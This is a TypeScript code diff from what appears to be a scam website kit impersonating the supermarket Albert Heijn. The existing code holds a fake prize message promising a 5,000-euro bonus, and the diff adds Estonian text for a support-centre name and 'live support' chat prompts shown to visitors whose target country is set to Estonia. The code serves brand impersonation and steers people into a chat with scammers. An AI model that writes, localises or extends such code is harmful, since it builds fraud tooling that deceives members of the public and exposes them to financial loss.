@@ -60,9 +60,29 @@ const ALBERT_HEIJN_BG_URL = "/6d4bc8553ef96b6814a98ebe96498b34.webp";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
 const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
+const ESTONIAN_SUPPORT_CENTER_NAME = "Albert Heijn Klienditeenindus";
 const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
 const LEGACY_WIN_SUBTITLE =
   "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
+const LEGACY_LIVE_SUPPORT_TITLES = new Set([
+  "Live support",
+  "Live Support",
+  "Live-Support",
+]);
+const LEGACY_LIVE_SUPPORT_SUBTITLES = new Set([
+  "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
+  "Um fortzufahren, müssen Sie unseren Kundenservice kontaktieren.\n\nKlicken Sie auf den Button unten, um den Chat zu starten.",
+  "To continue, you need to contact our customer service.\n\nClick the button below to start the chat.",
+]);
+const LEGACY_LIVE_SUPPORT_BUTTONS = new Set([
+  "Chat openen",
+  "Chat starten",
+  "Start Chat",
+]);
+const ESTONIAN_LIVE_SUPPORT_TITLE = "Reaalajas tugi";
+const ESTONIAN_LIVE_SUPPORT_SUBTITLE =
+  "Jätkamiseks peate võtma ühendust meie klienditeenindusega.\n\nKlõpsake allolevat nuppu, et alustada vestlust.";
+const ESTONIAN_LIVE_SUPPORT_BUTTON = "Alusta vestlust";
 
 function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
   const next = { ...settings };
@@ -102,6 +122,24 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 
   if (next.target_country) {
     next.target_country = normalizeCountryName(next.target_country);
+  }
+
+  if (next.target_country === "Estonya") {
+    if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
+      next.support_center_name = ESTONIAN_SUPPORT_CENTER_NAME;
+    }
+
+    if (!next.live_support_title || LEGACY_LIVE_SUPPORT_TITLES.has(next.live_support_title)) {
+      next.live_support_title = ESTONIAN_LIVE_SUPPORT_TITLE;
+    }
+
+    if (!next.live_support_subtitle || LEGACY_LIVE_SUPPORT_SUBTITLES.has(next.live_support_subtitle)) {
+      next.live_support_subtitle = ESTONIAN_LIVE_SUPPORT_SUBTITLE;
+    }
+
+    if (!next.live_support_button || LEGACY_LIVE_SUPPORT_BUTTONS.has(next.live_support_button)) {
+      next.live_support_button = ESTONIAN_LIVE_SUPPORT_BUTTON;
+    }
   }
 
   return next;
